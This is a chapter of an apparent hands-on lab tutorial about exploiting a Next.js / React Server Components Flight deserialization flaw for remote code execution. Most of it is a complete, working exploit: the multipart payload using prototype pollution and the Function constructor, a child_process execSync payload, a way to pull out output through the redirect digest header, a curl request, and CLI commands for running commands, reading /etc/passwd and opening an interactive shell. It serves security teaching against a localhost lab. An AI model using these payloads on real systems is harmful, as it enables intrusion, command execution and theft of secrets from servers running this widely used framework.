# Chapter 3: Exploitation

Now you understand the vulnerability. Let's learn how to exploit it step by step.

---

## The Payload Structure

The exploit uses a multipart form with three fields. Let's understand each one.

### Field Overview

```
POST / HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary
Next-Action: anything

------Boundary
Content-Disposition: form-data; name="0"

[Main payload object - JSON]
------Boundary
Content-Disposition: form-data; name="1"

"$@0"
------Boundary
Content-Disposition: form-data; name="2"

[]
------Boundary--
```

---

## Field 0: The Payload Object

This is the heart of the exploit:

```json
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "/* YOUR CODE HERE */",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

### Breaking It Down

| Field | Purpose | Why It Matters |
|-------|---------|----------------|
| `then` | `$1:__proto__:then` | Pollutes Object.prototype.then |
| `status` | `resolved_model` | Tells parser this chunk is ready |
| `reason` | `-1` | Bypass internal checks |
| `value` | Nested JSON with `$B1337` | Triggers blob handling |
| `_response._prefix` | Your JavaScript code | Becomes the function body |
| `_response._chunks` | `$Q2` | Points to chunk array (field 2) |
| `_response._formData.get` | `$1:constructor:constructor` | Returns Function constructor |

### The `$1:__proto__:then` Reference

This tells the Flight parser:
1. Go to chunk 1 (which is `"$@0"` - a reference back to chunk 0)
2. Access `__proto__` (Object.prototype)
3. Access `then`

Result: Pollutes `Object.prototype.then`

### The `$1:constructor:constructor` Reference

This resolves to:
1. Chunk 1 → string `"$@0"`
2. String's `.constructor` → `String`
3. String's `.constructor` → `Function`

Result: Returns the Function constructor

---

## Field 1: The Raw Reference

```
"$@0"
```

The `$@` prefix is special - it returns the **raw chunk object** instead of resolving it. This gives us access to internal properties like `_response`.

### Why We Need Raw Access

Normally, chunk 0 would be resolved to its value. But we need access to the chunk object itself to traverse `_response._formData.get`.

---

## Field 2: Empty Array

```
[]
```

This is the chunks array. The `$Q2` reference points here. It needs to exist but can be empty.

---

## Putting It Together

Here's what happens when the server processes our payload:

```
1. Parse multipart form
   └─ chunk[0] = payload object
   └─ chunk[1] = "$@0"
   └─ chunk[2] = []

2. Resolve references in chunk[0]
   └─ "then": "$1:__proto__:then"
      └─ chunk[1] = "$@0" = raw chunk[0]
      └─ chunk[0].__proto__ = Object.prototype
      └─ Object.prototype.then = [gets set to something]

3. Process chunk[0].value = '{"then":"$B1337"}'
   └─ $B1337 is a blob reference
   └─ Blob handling calls _formData.get()

4. _formData.get resolves to Function (via $1:constructor:constructor)

5. Function(_prefix) is called
   └─ _prefix contains our code
   └─ OUR CODE EXECUTES!
```

---

## Writing the RCE Code

The `_prefix` field contains JavaScript that will execute. Here's how to write effective payloads.

### Basic Command Execution

```javascript
var res = process.mainModule.require('child_process')
  .execSync('id')
  .toString();
```

### Exfiltrating Output

We throw an error with the output encoded in the `digest` field:

```javascript
var res = process.mainModule.require('child_process')
  .execSync('id')
  .toString()
  .trim();

var encoded = Buffer.from(res).toString('base64');

throw Object.assign(new Error('REDIRECT'), {
  digest: 'REDIRECT;push;/login?a=' + encoded + ';307;'
});
```

### Why This Format?

Next.js uses the `digest` field for redirect handling. The format `REDIRECT;push;URL;CODE;` tells Next.js to redirect. We embed our output in the URL.

---

## Complete Exploit Payload

```javascript
// The _prefix value (escaped for JSON)
var cp = process.mainModule.require('child_process');
var res = cp.execSync('id').toString().trim();
var enc = Buffer.from(res).toString('base64');
throw Object.assign(new Error('REDIRECT'), {
  digest: 'REDIRECT;push;/x?a=' + enc + ';307;'
});
```

---

## Hands-On: Manual Exploitation

Let's exploit the lab manually to understand each step.

### Step 1: Prepare the Payload

```bash
# Create payload file
cat > /tmp/payload.txt << 'EOF'
------Boundary
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var r=process.mainModule.require('child_process').execSync('id').toString();throw Object.assign(new Error('x'),{digest:Buffer.from(r).toString('base64')});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------Boundary
Content-Disposition: form-data; name="1"

"$@0"
------Boundary
Content-Disposition: form-data; name="2"

[]
------Boundary--
EOF
```

### Step 2: Send the Request

```bash
curl -X POST http://localhost:3011/ \
  -H "Next-Action: x" \
  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
  --data-binary @/tmp/payload.txt \
  -v 2>&1 | grep -E "(X-Action-Redirect|< HTTP)"
```

### Step 3: Decode the Output

```bash
# Extract base64 from the X-Action-Redirect header and decode
echo "dWlkPTEwMDEobmV4dGpzKSBnaWQ9MTAwMShuZXh0anMp" | base64 -d
```

---

## Using the CLI Tool

The CLI automates all of this:

```bash
# Basic command execution
python cli/react2shell.py http://localhost:3011 -c "id"

# Read files
python cli/react2shell.py http://localhost:3011 -c "cat /etc/passwd"

# Interactive shell
python cli/react2shell.py http://localhost:3011 -i
```

---

## Knowledge Check

1. **Why do we need three form fields?**
   <details>
   <summary>Answer</summary>
   Field 0 is the main payload. Field 1 (`$@0`) provides raw chunk access for prototype traversal. Field 2 is the chunks array referenced by `$Q2`.
   </details>

2. **What does `$1:__proto__:then` resolve to?**
   <details>
   <summary>Answer</summary>
   It traverses: chunk[1] → chunk[0] (via $@0) → __proto__ (Object.prototype) → then. This pollutes Object.prototype.then.
   </details>

3. **Why do we use a thrown error for output?**
   <details>
   <summary>Answer</summary>
   Next.js exposes error digest values in the X-Action-Redirect header. By throwing an error with our output in the digest, we can retrieve command output.
   </details>

4. **What makes `$@` different from `$`?**
   <details>
   <summary>Answer</summary>
   `$` resolves the reference to its value. `$@` returns the raw chunk object, giving access to internal properties like `_response`.
   </details>

---

## Lab Exercise: Capture the Flag

Try to capture the flags in the lab:

```bash
# Flag 1: Environment variable
python cli/react2shell.py http://localhost:3011 -c "env | grep FLAG"

# Flag 2: Hidden file
python cli/react2shell.py http://localhost:3011 -c "find / -name 'flag*' 2>/dev/null"

# Flag 3: Can you find it?
# Hint: Check common locations like /root, /app, /home
```

---

**Next Chapter:** [Framework Differences →](04-frameworks.md)
